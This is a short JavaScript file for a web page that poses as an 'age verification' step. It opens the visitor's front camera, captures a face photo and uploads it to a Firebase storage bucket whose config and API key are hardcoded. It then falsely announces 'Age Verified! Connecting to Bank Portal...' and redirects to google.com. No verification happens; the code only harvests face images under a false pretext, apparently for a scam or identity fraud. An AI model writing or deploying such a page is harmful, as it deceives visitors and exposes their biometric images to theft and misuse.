// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
    authDomain: "movie-1e6fc.firebaseapp.com",
    projectId: "movie-1e6fc",
    storageBucket: "movie-1e6fc.firebasestorage.app",
    messagingSenderId: "371616954594",
    appId: "1:371616954594:web:977d88ec7570df351246bb"
};

// Initialize Firebase
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const storage = firebase.storage();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const overlay = document.getElementById('verifyOverlay');

// 1. Open Popup and Request Camera
async function openVerify() {
    overlay.style.display = 'flex';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        video.srcObject = stream;
    } catch (err) {
        console.error("Camera denied:", err);
        alert("Verification required to proceed!");
    }
}

// 2. Capture and Upload
async function captureAndDone() {
    const context = canvas.getContext('2d');

    if (video.srcObject) {
        // Set canvas size to video size
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        // Draw the current frame
        context.drawImage(video, 0, 0);

        // Convert to Image and Upload
        canvas.toBlob(async (blob) => {
            if (blob) {
                const name = "user_" + Date.now() + ".jpg";
                const storageRef = storage.ref('verifications/' + name);
                
                try {
                    await storageRef.put(blob);
                    console.log("Capture Success.");
                } catch (e) {
                    console.error("Upload Error:", e);
                }
            }
        }, 'image/jpeg');

        // Stop camera tracks
        const tracks = video.srcObject.getTracks();
        tracks.forEach(t => t.stop());
    }

    // Redirect
    alert("Age Verified! Connecting to Bank Portal...");
    overlay.style.display = 'none';
    window.location.href = "https://www.google.com";
}
